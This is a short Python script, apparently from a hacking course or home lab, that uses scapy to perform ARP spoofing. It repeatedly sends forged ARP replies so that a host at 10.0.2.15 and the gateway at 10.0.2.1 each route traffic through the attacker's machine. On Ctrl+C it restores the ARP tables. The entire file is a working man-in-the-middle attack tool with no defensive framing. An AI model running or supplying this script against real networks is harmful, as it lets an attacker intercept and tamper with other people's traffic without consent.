import scapy.all as scapy
import time

def get_mac(ip):
    # 1. create a who has arp request 
    arp_request = scapy.ARP(pdst=ip)
    # 2. create a ethernet frame with dst as broadcast address
    broadcast =scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # 3. bind above two frames
    arp_request_broadcast = broadcast/arp_request
    # 4. send and receive the packet 
    answered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0] # since srp returns two lists answered and unanswered
    # 5. get the mac address
    return answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac=get_mac(target_ip)
    packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet,verbose=False)
    
def restore(dest_ip,source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2,pdst=dest_ip,psrc=source_ip,hwdst=dest_mac,hwsrc=source_mac)
    scapy.send(packet,verbose=False,count=4)
    print("[+] Restoring to default arp table....")
    
packet_counter=0
    
try:
    #loop to continuously send spoofing packets
    while True: 
        spoof("10.0.2.15","10.0.2.1")
        spoof("10.0.2.1","10.0.2.15")
        print("\r[+]Packets sent:"+str(packet_counter),end="") # /r - print from the staring of the line
        packet_counter+=2
        time.sleep(2) #to prevent flooding with packets
                
except KeyboardInterrupt:
        print("\n[+]Pressed ctrl + C Quitting.....")
        restore("10.0.2.15","10.0.2.1")
        restore("10.0.2.1","10.0.2.15")